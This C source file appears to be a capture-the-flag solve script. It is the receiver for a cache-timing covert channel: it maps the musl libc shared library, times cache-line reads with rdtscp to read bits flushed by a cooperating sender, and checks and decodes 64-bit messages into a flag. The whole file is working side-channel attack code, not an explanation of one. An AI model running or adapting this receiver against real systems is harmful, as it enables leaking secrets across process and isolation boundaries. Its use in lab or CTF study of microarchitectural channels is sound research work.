#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <x86intrin.h>

#define CACHE_LINE   64
#define NUM_LINES    64
#define THRESHOLD    25
#define PREFETCHES   32
#define MEASUREMENTS 32

#define START_MARKER 0xDEADBEEF00000001ULL
#define END_MARKER   0xDEADBEEF00000002ULL

volatile char *base;

// CRC32C table (Castagnoli polynomial)
static uint32_t crc32c_table[256];

void init_crc32c_table() {
    for (uint32_t i = 0; i < 256; i++) {
        uint32_t crc = i;
        for (int j = 0; j < 8; j++) {
            crc = (crc >> 1) ^ ((crc & 1) ? 0x82F63B78 : 0);
        }
        crc32c_table[i] = crc;
    }
}

uint32_t crc32c_u32(uint32_t crc, uint32_t data) {
    crc ^= data;
    for (int i = 0; i < 4; i++) {
        crc = (crc >> 8) ^ crc32c_table[crc & 0xFF];
    }
    return crc;
}

uint32_t crc32c_u16(uint32_t crc, uint16_t data) {
    crc ^= data;
    for (int i = 0; i < 2; i++) {
        crc = (crc >> 8) ^ crc32c_table[crc & 0xFF];
    }
    return crc;
}

// Checksum matching Rust implementation [2]
uint16_t compute_checksum(uint32_t value, uint16_t idx) {
    uint32_t chk = 0xDEADBEEF;
    chk = crc32c_u32(chk, value);
    chk = crc32c_u16(chk, idx);
    return (uint16_t)(chk ^ (chk >> 16));
}

// Single timing measurement
uint64_t measure_line_internal(int line) {
    unsigned int junk;
    volatile char *addr = base + line * CACHE_LINE;
    
    uint64_t t1 = __rdtscp(&junk);
    junk = *(volatile uint32_t*)addr;
    uint64_t t2 = __rdtscp(&junk);
    
    return t2 - t1;
}

// Measure with prefetch, return average [2]
uint64_t measure_line(int line) {
    uint64_t sum = 0;
    
    // Prefetch first [2]
    _mm_prefetch((const char*)(base + line * CACHE_LINE), _MM_HINT_T0);
    
    for (int i = 0; i < PREFETCHES; i++) {
        sum += measure_line_internal(line);
    }
    
    return sum / PREFETCHES;
}

// Returns 1 if line is slow (was flushed = bit set) [2]
int is_line_positive(int line) {
    int likelihood = 0;
    
    for (int i = 0; i < MEASUREMENTS; i++) {
        if (measure_line(line) > THRESHOLD) {
            likelihood++;
        }
    }
    
    return likelihood > (MEASUREMENTS >> 1);
}

// Sample full pattern, return mode (most frequent) [2]
uint64_t load_lines() {
    uint64_t samples[MEASUREMENTS];
    int counts[MEASUREMENTS];
    int unique_count = 0;
    
    memset(samples, 0, sizeof(samples));
    memset(counts, 0, sizeof(counts));
    
    for (int m = 0; m < MEASUREMENTS; m++) {
        uint64_t current = 0;
        
        // Build full 64-bit sample
        for (int i = 0; i < NUM_LINES; i++) {
            current |= ((uint64_t)is_line_positive(i) << i);
        }
        
        // Track frequency [2]
        int found = 0;
        for (int j = 0; j < unique_count; j++) {
            if (samples[j] == current) {
                counts[j]++;
                found = 1;
                break;
            }
        }
        if (!found) {
            samples[unique_count] = current;
            counts[unique_count] = 1;
            unique_count++;
        }
    }
    
    // Return most common [2]
    int max_idx = 0;
    for (int i = 1; i < unique_count; i++) {
        if (counts[i] > counts[max_idx]) {
            max_idx = i;
        }
    }
    
    return samples[max_idx];
}

int main() {
    init_crc32c_table();
    
    int fd = open("/lib/libc.musl-x86_64.so.1", O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }
    
    base = mmap(NULL, CACHE_LINE * 0x1000, PROT_READ, MAP_SHARED, fd, 0);
    if (base == MAP_FAILED) { perror("mmap"); return 1; }
    
    // Touch pages
    for (int i = 0; i < NUM_LINES; i++) {
        (void)*(base + i * CACHE_LINE);
    }
    
    char flag[4096] = {0};
    int max_len = 0;
    
    printf("[*] Waiting for START marker...\n");
    fflush(stdout);
    
    // Wait for START [2]
    while (load_lines() != START_MARKER) {}
    
    printf("[*] START received, reading data...\n");
    fflush(stdout);
    
    // Receive loop [2]
    while (1) {
        uint64_t value = load_lines();
        
        if (value == END_MARKER) {
            printf("[*] END received\n");
            break;
        }
        
        // Decode message struct [2]
        uint32_t data = value & 0xFFFFFFFF;
        uint16_t idx = (value >> 32) & 0xFFFF;
        uint16_t chk = (value >> 48) & 0xFFFF;
        
        // Verify checksum [2]
        if (chk == compute_checksum(data, idx)) {
            memcpy(flag + idx * 4, &data, 4);
            int end_pos = (idx + 1) * 4;
            if (end_pos > max_len) max_len = end_pos;
            printf("[%03d] OK: \"%.4s\"\n", idx, (char*)&data);
        } else {
            printf("[%03d] CRC FAIL: 0x%016lx\n", idx, value);
        }
        fflush(stdout);
    }
    
    flag[max_len] = '\0';
    printf("\n=== FLAG ===\n%s\n", flag);
    
    return 0;
}